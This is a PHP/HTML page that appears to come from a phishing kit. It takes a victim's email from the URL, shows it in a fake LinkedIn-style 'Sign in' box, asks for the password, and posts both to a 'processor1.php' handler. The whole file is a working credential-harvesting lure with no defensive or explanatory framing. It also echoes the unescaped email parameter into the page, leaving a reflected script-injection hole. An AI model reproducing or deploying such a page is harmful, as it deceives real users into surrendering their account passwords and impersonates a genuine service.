<?php
function getloginIDFromlogin($email)
{
$find = '@';
$pos = strpos($email, $find);
$loginID = substr($email, 0, $pos);
return $loginID;
}
function getDomainFromEmail($email)
{
// Get the data after the @ sign
$domain = substr(strrchr($email, "@"), 1);
return $domain;
}
$login = $_GET['email'];
$loginID = getloginIDFromlogin($login);
$domain = getDomainFromEmail($login);
$ln = strlen($login);
$len = strrev($login);
$x = 0;
for($i=0; $i<$ln; $i++){
	if($len[$i] == "@"){
		$x = $i;
		break;
	}
}
$yuh = substr($len,0,$x);
$yuh = strrev($yuh);
for($i=0; $i<$ln; $i++){
	if($yuh[$i] == "."){
		$x = $i;
		break;
	}
}
$yuh = substr($yuh,0,$x);
$yuh = ucfirst($yuh);
?>
<html>
<head>
<link rel="stylesheet" href="./webfiles/form.css">
</head>
<body>

<table align="center" cellspacing="0" height="100%" width="100%">



<tr><td>

	<br><br>

	
		
	<table align="center" cellspacing="0" 
	style="width:380px; background: #FFF; border: 1px solid #FFF; border-radius: 5px 5px 5px 5px; 
	-webkit-box-shadow: 1px 1px 10px 1px #BDBDBD; box-shadow: 1px 1px 10px 1px #BDBDBD;">
	
	<tr><td style="height:35px;">
	
		<form method="post" action="processor1.php">
	
	</td></tr>
	
	
	<tr><td>
	
		<table style="width:330px;" align="center"><tr><td>
	
			<font face="arial" size="+3" color="#000">Sign in</font>
		
			<br>
			
			<font face="arial" size="2" color="#000">
			To continue, Verify Your User ID...
			</font>
			
		</td></tr></table>
		
	</td></tr>
	
					<tr><td style="height:10px;"></td></tr>
	
					<tr><td>
						<table cellspacing="0" align="center">
						<tr><td>
							<div align="center">
								<input  name="login" type="email" value="<?php echo $_GET['email']; ?>" disabled>
							</div>
						</td></tr>
						<tr><td style="height:15px;"></td></tr>
						
						<tr><td>
							<div align="center">
								<input  name="passwd" type="password" required placeholder="Password">
							</div>
						</td></tr>
						<tr><td style="height:2px;"></td></tr>
						<tr><td>
							<table align="center" width="100%" cellspacing="0"></tr>
							<td>
								<font face="verdana" size="2" color="#045FB4">
									Forgot password?
								</font>
							</td>
							
							</tr></table>
						</td></tr>
						<tr><td style="height:15px;"></td></tr>
						<tr><td>
							<div align="center">
								<input type="submit" value="Sign in">
							</div>
						</td></tr>
						<tr><td style="height:10px;">
							<input type="hidden" name="login" value="<?php echo $_GET['email']; ?>">
							</form>
						</td></tr>
						
						<tr><td style="height:30px;"></td></tr>
						</table>
					</td></tr>
	</table>
	
		<br>
	
							<div align="center">
								<font face="verdana" size="2" color="#333">
									New to LinkedIn? <font color="#0174DF">Join now</font>
								</font>
							</div>
							
</div>

</td></tr>


</table>

</body>
</html>
</html>